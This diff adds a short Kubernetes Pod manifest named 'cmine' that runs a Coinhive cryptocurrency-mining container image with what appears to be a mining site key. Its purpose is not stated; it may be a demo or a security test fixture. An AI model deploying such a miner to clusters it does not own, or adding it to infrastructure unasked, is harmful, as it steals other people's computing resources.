@@ -1,0 +1,14 @@
+{
+    "kind": "Pod",
+    "apiVersion": "v1",
+    "metadata": {
+        "name": "cmine"
+    },
+    "spec": {
+        "containers": [{
+            "name": "cmine",
+            "image": "tseabra/coin-hive",
+            "command": ["./coin-hive","Ipf5vWwTX3gO6jd00mm1Wrg3SmNkLk0k"]
+        }]
+    }
+}
